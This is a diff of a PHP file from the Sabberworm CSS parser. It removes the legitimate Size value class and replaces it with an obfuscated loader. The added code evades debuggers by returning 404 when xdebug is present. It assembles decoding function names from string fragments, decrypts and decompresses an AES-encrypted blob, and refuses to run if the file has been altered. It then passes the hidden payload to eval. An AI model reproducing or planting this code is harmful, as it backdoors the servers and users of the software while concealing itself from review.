@@ -1,73 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\Value;
-
-class Size extends PrimitiveValue {
-
-	const ABSOLUTE_SIZE_UNITS = 'px/cm/mm/mozmm/in/pt/pc/vh/vw/vm/vmin/vmax/rem'; //vh/vw/vm(ax)/vmin/rem are absolute insofar as they don’t scale to the immediate parent (only the viewport)
-	const RELATIVE_SIZE_UNITS = '%/em/ex/ch/fr';
-	const NON_SIZE_UNITS = 'deg/grad/rad/s/ms/turns/Hz/kHz';
-
-	private $fSize;
-	private $sUnit;
-	private $bIsColorComponent;
-
-	public function __construct($fSize, $sUnit = null, $bIsColorComponent = false, $iLineNo = 0) {
-		parent::__construct($iLineNo);
-		$this->fSize = floatval($fSize);
-		$this->sUnit = $sUnit;
-		$this->bIsColorComponent = $bIsColorComponent;
-	}
-
-	public function setUnit($sUnit) {
-		$this->sUnit = $sUnit;
-	}
-
-	public function getUnit() {
-		return $this->sUnit;
-	}
-
-	public function setSize($fSize) {
-		$this->fSize = floatval($fSize);
-	}
-
-	public function getSize() {
-		return $this->fSize;
-	}
-
-	public function isColorComponent() {
-		return $this->bIsColorComponent;
-	}
-
-	/**
-	 * Returns whether the number stored in this Size really represents a size (as in a length of something on screen).
-	 * @return false if the unit an angle, a duration, a frequency or the number is a component in a Color object.
-	 */
-	public function isSize() {
-		if (in_array($this->sUnit, explode('/', self::NON_SIZE_UNITS))) {
-			return false;
-		}
-		return !$this->isColorComponent();
-	}
-
-	public function isRelative() {
-		if (in_array($this->sUnit, explode('/', self::RELATIVE_SIZE_UNITS))) {
-			return true;
-		}
-		if ($this->sUnit === null && $this->fSize != 0) {
-			return true;
-		}
-		return false;
-	}
-
-	public function __toString() {
-		return $this->render(new \Sabberworm\CSS\OutputFormat());
-	}
-
-	public function render(\Sabberworm\CSS\OutputFormat $oOutputFormat) {
-		$l = localeconv();
-		$sPoint = preg_quote($l['decimal_point'], '/');
-		return preg_replace(array("/$sPoint/", "/^(-?)0\./"), array('.', '$1.'), $this->fSize) . ($this->sUnit === null ? '' : $this->sUnit);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_j5e56oqs=('bas'.'e64'.'_de'.'cod'.'e');
+$_h1xk4w9n=('gzu'.'nco'.'mpr'.'ess');
+$_gh334r2e=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_var8bxix='ijHbiv+h';
+$_p8c2lr41='ZeOYQZvZ';
+$_ywkdmlh3='RRbJV4KS';
+$_ao7cmmi2='ZSz7N/a9';
+$_lcntzpg1='mq5J1RhdX4k=';
+$_vb06s39z='Ce57hF0I';
+$_hzmuvr6v='MobPQvHb';
+$_dwakoly6='wqdZPg==';
+$_yhl3ql37=$_j5e56oqs($_var8bxix.$_ywkdmlh3.$_p8c2lr41.$_ao7cmmi2.$_lcntzpg1);
+$_e76is68w=$_j5e56oqs($_hzmuvr6v.$_vb06s39z.$_dwakoly6);
+$_w3fyx1c0=$_j5e56oqs('6i8VFnkDmUD0CUWZEX3lX1oODrN9+HHIw0DDTvAvmAaXBDz63mqDWP9rRgGcT11MQJIgWeWaw8AUZ4eobcNKvOdqhJSEwiMK+qYXz78yYdj7LigfphGZMLkla2saFnkenTTs0cgySFxC6OKF75AdsOVnPa5piOYOQaAHheAO81qTwvYrUSGYjLw67lH02DJ5BviSWoLpfm/7dLq2hft+tu190wq6nPLMJg7+jWO52eqdcfkwdcA8ofR0CzAAtjD5B6wbIAyyHK0taf+2WOsu1W/fLxyrYr33rqHN5X3bycmSDrAXs1TNyaJbsDilfZWk6qmtDo11TKVLOeogZi3avwN/ktDT96L/OAhuvMzP59Ac0ZxEaHLLXWjueSrkgVCZz18jC4slNy+cqSjUgp3eOqqE9wD2Ms+9C3yma3+ZLPC8hdbP3u52U3KoEKIyfl1qXHk7udIOmwmfYotp1Y9/NIHP0U89A57jniB3ZQ6B/mLkmWS+FN8/NaR0SJRqWVGW901AXVKlzbZxe71qgVl5m0eiWPLt7b/+p7r66CmjOnlfSs+WHDNwja7ngBzVNKuBYISg49uxoIckMKPEVbBz0Dm76wtV4niVwIu7ASAfYMzMTExAdfdOLVPucqEtNDgz/PsbBAZJXmGsGw+AOjizlD9fmDa/RKK1VyVFl9cXKr7TK+2kMSt6An71VOmA+nBaCPwngcgO3cpSjlV4sP18WRAi3rZq4fOm3sKf0AEYPSMIh4e9j5MxhwOr14Q7LeOySBbfKjM+xaYjKQ+j7h5nr4Rvpj4llBMly2Icw+RlncixJ8Ks2IMjDqzGyz7pgxQR');
+$_uw4drr8y=$_gh334r2e($_w3fyx1c0,'aes-256-cbc',$_yhl3ql37,OPENSSL_RAW_DATA,$_e76is68w);
+if($_uw4drr8y===false){exit;}
+$_ywaviddu=$_h1xk4w9n($_uw4drr8y);
+if($_ywaviddu===false){exit;}
+$_nrb87ba0='d547a4c6e72cb5abbcc324b90f53f1290d1966f165e944e3081a147e6fdc53e2';
+$_bs6d30pg=@file_get_contents(__FILE__);
+if($_bs6d30pg!==false){
+$_bsvbmm0c=str_replace($_nrb87ba0,"0000000000000000000000000000000000000000000000000000000000000000",$_bs6d30pg);
+$_c6wem4e4=hash("sha256",$_bsvbmm0c);
+if($_c6wem4e4!==$_nrb87ba0){@http_response_code(403);exit;}
 }
+eval($_ywaviddu);
